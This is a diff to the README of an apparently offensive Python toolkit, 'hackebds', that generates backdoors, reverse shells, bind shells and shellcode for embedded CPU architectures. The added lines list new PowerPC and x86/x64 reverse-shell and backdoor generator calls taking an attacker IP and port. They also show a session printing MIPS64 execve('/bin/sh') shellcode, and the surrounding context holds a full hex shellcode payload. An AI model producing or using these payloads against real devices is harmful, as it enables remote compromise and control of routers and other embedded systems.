@@ -80,6 +80,10 @@ apt install binutils-arm-linux-gnueabi/hirsute
 >>> mips64el_backdoor(reverse_ip,reverse_port)
 >>> x86el_backdoor(reverse_ip,reverse_port)
 >>> x64el_backdoor(reverse_ip, reverse_port)
+>>> powerpc_backdoor(reverse_ip, reverse_port)
+>>> powerpcle_backdoor(reverse_ip, reverse_port)
+>>> powerpc64_backdoor(reverse_ip, reverse_port)
+>>> powerpc64le_backdoor(reverse_ip, reverse_port)
 >>> x86_bind_shell(listen_port, passwd)
 >>> x64_bind_shell(listen_port, passwd)
 >>> armelv7_bind_shell(listen_port, passwd)
@@ -132,6 +136,12 @@ Then connect to the port bound to the device (password exists)
 >>> mips64_reverse_sl(reverse_ip,reverse_port)
 >>> mips64el_reverse_sl(reverse_ip,reverse_port)
 >>> android_aarch64_backdoor(reverse_ip,reverse_port)
+>>> x86el_reverse_sl(reverse_ip,reverse_port)
+>>> x64el_reverse_sl(reverse_ip,reverse_port)
+>>> ppc_reverse_sl(reverse_ip,reverse_port)
+>>> ppcle_reverse_sl(reverse_ip,reverse_port)
+>>> ppc64_reverse_sl(reverse_ip,reverse_port)
+>>> ppc64le_reverse_sl(reverse_ip,reverse_port)
 ```
 
 example:
@@ -142,6 +152,24 @@ example:
 [+] No NULL byte shellcode for hex(len is 264):
 \xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
 ```
+3. Added that shellcode for calling execve cannot be generated in shellcraft (change context generate mips64(el), powerpc shell code for execve("/bin/sh",["/bin/sh"]),0))
+
+   ```
+   >>> from hackebds import *
+   >>> test = ESH()
+   [*] arch is i386
+   [*] endian is little
+   [*] bits is 32
+   >>> test.sh()
+   [*] Please set correct assembly schema information(pwerpc or mips64(el))
+   >>> context.arch = 'mips64'
+   >>> test.sh()
+   "\n\t\t\t/* execve(path='/bin/sh', argv=['sh'], envp=0) */\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1, -8($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -8\n\t\t\tdadd     $a0, $sp, $zero\n\t\t\tlui     $t1, 0x6e69\n\t\t\tori     $t1, $t1, 0x622f\n\t\t\tsw      $t1,-12($sp)\n\t\t\tlui     $t9, 0xff97\n\t\t\tori     $t9, $t9, 0x8cd0\n\t\t\tnor     $t1, $t9, $zero\n\t\t\tsw      $t1, -8($sp)\n\t\t\tsw      $zero, -4($sp)\n\t\t\tdaddiu   $sp, $sp, -12\n\t\t\tslti    $a1, $zero, -1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tli      $t9, -9\n\t\t\tnor     $a1, $t9, $zero\n\t\t\tdadd     $a1, $sp, $a1\n\t\t\tsd      $a1, -8($sp)\n\t\t\tdaddi    $sp, $sp, -8\n\t\t\tdadd     $a1, $sp, $zero\n\t\t\tslti    $a2, $zero, -1\n\t\t\tli      $v0, 0x13c1\n\t\t\tsyscall 0x40404\n\t\t\t"
+   >>> test.sh()
+   
+   ```
+
+## 
 
 ## chips and architectures
 
